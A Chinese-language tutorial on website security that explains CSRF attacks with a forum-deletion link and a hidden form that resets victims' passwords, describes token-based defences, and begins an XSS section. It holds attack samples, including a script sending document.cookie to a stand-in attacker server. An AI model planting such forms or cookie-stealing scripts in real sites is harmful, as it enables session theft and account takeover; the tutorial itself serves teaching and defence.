## 网站安全与防范

### CSRF攻击

简单点说，CSRF跨站请求伪造（英语：Cross-site request forgery），就是攻击者利用受害者的身份，以受害者的名义发送恶意请求。与XSS（Cross-site scripting，跨站脚本攻击）不同的是，XSS的目的是获取用户的身份信息，攻击者窃取到的是用户的身份（session/cookie），而CSRF则是利用用户当前的身份去做一些未经过授权的操作。

CSRF攻击最早在2001年被发现，由于它的请求是从用户的IP地址发起的，因此在服务器上的web日志中可能无法检测到是否受到了CSRF攻击，正是由于它的这种隐蔽性，很长时间以来都没有被公开的报告出来，直到2007年才真正的被人们所重视。

#### CSRF有哪些危害

CSRF可以盗用受害者的身份，完成受害者在web浏览器有权限进行的任何操作，想想吧，能做的事情太多了。

- 以你的名义发送诈骗邮件，消息
- 用你的账号购买商品
- 用你的名义完成虚拟货币转账
- 泄露个人隐私

#### 举个栗子

##### get请求

网站论坛，删除帖子的操作是通过点击http://test.com/article/del/1120这样的链接，以get方式提交到服务器。然后服务器根据当前用户的session获取用户的身份，判断操作是有有效并执行。

按照正常逻辑，这样实现是没有问题的。但是假设一位黑客访问网站后，在网站上传了一张图片，图片的链接地址为：http://test.com/article/del/1120，虽然这样的地址图片是无法加载的。但是如果管理员打开这篇帖子时，浏览器还是会发出该链接的请求。

执行以上操作后，这篇文章就会被删除，在代码逻辑中，也是正确的。

##### post请求

相对于get请求攻击，post请求攻击更加复杂，黑客攻击难度也比较大。

```html
<div style="display:none;">
<from action="http://test.com/user/change_pwd" id="CSRF_form" method="post">
<input type="password" name="pwd" value="123456" />
<input type="password" name="again_pwd" value="123456" />
</from>
</div>
<img src="http://test.com/images/girl.png" onclick="document.getElementById("CSRF_form").submit();">
```

查看以上代码，是不是很熟悉。通过点击图片，将表单进行提交。

很多网站，用户修改密码的操作，就是点击一个页面，然后输入两次新的密码，点击提交，密码就修改完成了，类似于上面的表单。

很多编辑器是支持编辑html源码的，比如百度的ueditor。黑客将上面的代码放到你的网站，然后其他用户浏览后，点击了图片，就会将自己的密码为123456。

#### 如何防范

首先网站在开发时，需要遵守RESTful架构。

在该架构里面，web服务中的操作主要包括post、delete、put、get，对应的就是正删改查。

get操作通过get请求实现，post、delete、put请求通过post模拟请求实现。也就是说，涉及到数据库增删改的操作，就必须通过post方式提交。

给表单提交嵌入一个token。

```html
<from action="http://test.com/user/change_pwd" id="CSRF_form" method="post">
<input type="hidden" name="_method" value="put" />  <!-- 改操作，模拟put提交  -->
<input type="hidden" name="_token" value="<?php echo $token ?>" />
<input type="password" name="pwd" value="" />
<input type="password" name="again_pwd" value="" />
</from>
```

如上，系统生成一个随机的token，并且将该token与session_id和当前页面的链接进行关联。当用户提交表单时，对这些数据进行验证，就可以保证用户不会被误操作。

### xss攻击

XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。

窃取cookies，读取目标网站的cookie发送到黑客的服务器上，如下面的代码：

```
var i=document.createElement("img");
document.body.appendChild(i);
i.src = "http://www.hackerserver.com/?c=" + document.cookie;
```

